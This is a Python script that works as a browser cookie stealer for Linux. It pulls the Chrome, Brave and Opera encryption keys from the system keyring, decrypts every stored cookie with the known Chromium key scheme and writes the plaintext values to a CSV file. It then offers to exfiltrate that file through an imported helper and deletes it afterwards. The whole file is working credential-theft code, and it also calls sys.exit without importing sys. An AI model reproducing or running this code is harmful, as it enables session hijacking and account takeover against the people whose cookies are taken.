from pathlib import Path
from exfiltration import exfiltrate
import secretstorage
import sqlite3
import csv
import os

from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2


# Database File
db_file = 'Cookies'

# Browser Path
OPERA_PATH = '/home/' + os.getlogin() + f'/.config/opera/{db_file}'
BRAVE_PATH = '/home/' + os.getlogin() + f'/.config/BraveSoftware/Brave-Browser/Default/{db_file}'
CHROME_PATH = '/home/' + os.getlogin() + f'/.config/google-chrome/Default/{db_file}'

# Set encryption key to blank to prevent error upon calling function
MY_PASS = b""

print(f"""Extracting Encryption Keys
==============================================================""")

def get_keys(browser):
    global MY_PASS
    try:
        bus = secretstorage.dbus_init()
        collection = secretstorage.get_default_collection(bus)
        for item in collection.get_all_items():
            if item.get_label() == browser:
                MY_PASS = item.get_secret()
                break
        else:
            print(f'[{browser}] password not found!')
    except:
        pass


get_keys("Chrome Safe Storage")
chrome_key = MY_PASS.decode()

get_keys("Brave Safe Storage")
brave_key = MY_PASS.decode()

get_keys("Chromium Safe Storage")
opera_key = MY_PASS.decode()

CHROME_PASSWORD = chrome_key
BRAVE_PASSWORD  = brave_key
OPERA_PASSWORD  = opera_key

# CSV File
data = open('cookies.csv',mode='a',newline='',encoding='utf-8')
csv_writer = csv.writer(data, delimiter=',')
csv_writer.writerow(["URL","Cookie Name","Cookie Expired","Port","Cookie Value"])
files = ['cookies.csv']

def get_encrypted_data(db_path):
    try:
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()
        data = cursor.execute('SELECT host_key,name,has_expires,source_port,encrypted_value FROM cookies')
        return data
    except sqlite3.OperationalError:
        print(f"[Error] {db_file} database not Found")
        pass
    
def get_decrypted_data(encryption_key,encrypted_password):
    global decrypted
    try:
        # trim off the 'v10' that Chrome/ium prepends
        encrypted_password = encrypted_password[3:]

        # making the key
        salt = b'saltysalt'
        iv = b' ' * 16
        length = 16
        iterations = 1
        pb_pass = encryption_key.encode('utf8')

        key = PBKDF2(pb_pass, salt, length, iterations)
        cipher = AES.new(key, AES.MODE_CBC, IV=iv)
    
        decrypted = cipher.decrypt(encrypted_password)
    except:
        print("[Building AES Key] Failed\n")
        pass
def dump_cookies(key,browser,browser_name):
    print(f"""\nDumping {browser_name} Cookies
==============================================================""")
    try:
        for host,name,expire,port,encrypted_password in get_encrypted_data(browser):
            if 'v11' in str(encrypted_password):
                pb_pass = key
            else:
                pb_pass = "peanuts"  
            get_decrypted_data(pb_pass,encrypted_password)
            csv_writer.writerow([host,name,str(expire),str(port),decrypted.decode()])
        data.close()
        print("[All Cookies Dumped] written data to cookies.csv\n")
    
    except:
        print("[Decryption Failed] Can't decode bytes\n")
        pass

        
dump_cookies(CHROME_PASSWORD,CHROME_PATH,"Chrome")
dump_cookies(BRAVE_PASSWORD,BRAVE_PATH,"Brave")
dump_cookies(OPERA_PASSWORD,OPERA_PATH,"Opera")

def cleanup(input_files):
    print("[*] Deleting files")
    for rm in input_files:
        file_exist = Path(rm)
        if file_exist.is_file():
            os.remove(rm)
            print("[*] " + rm + " Deleted")
        else:
            print("[!] " + rm + " File Not Found")

exfil = input("[?] Do you want to exfiltrate data: Y/N? ")
if exfil.upper() == "N":
    print("[!] Goodbye!")
    sys.exit()

if exfil.upper() == "Y":
    exfiltrate(files)
    cleanup(files)
